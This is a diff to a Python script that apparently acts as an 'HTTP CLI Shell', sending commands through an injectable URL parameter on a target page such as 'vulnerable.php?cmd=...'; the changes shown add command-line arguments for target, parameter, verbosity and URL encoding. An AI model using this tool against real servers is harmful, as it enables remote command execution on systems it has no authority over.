@@ -1,8 +1,10 @@
 import random
-import requests
 import string
+import argparse
 from html import unescape
 import urllib.parse
+
+import requests
 
 
 # Configuration
@@ -67,7 +69,6 @@ def send_command(command):
 
 
 def main():
-    
     is_successful, error_message = preflight_request()
     if is_successful:
         print("Connection successful!")
@@ -90,4 +91,19 @@ def main():
         else:
             print("[!] Failed to retrieve command output.")
 
-main()
+
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser(description="HTTP CLI Shell")
+    parser.add_argument("--address", "-a", help="Target address containing the full path. E.g., http://example.com/vulnerable.php")
+    parser.add_argument("--parameter", "-p", help="Parameter name where the injection will occur. E.g., 'cmd' for http://example.com/vulnerable.php?cmd=...")
+    parser.add_argument("--verbose", "-v", action="store_true", help="Verbose output")
+    parser.add_argument("--no-url-encode", action="store_true", help="Disable URL encoding of commands")
+
+    args = parser.parse_args()
+
+    address = args.address
+    parameter = args.parameter
+    url_encode = not args.no_url_encode
+    verbose = args.verbose
+    
+    main()
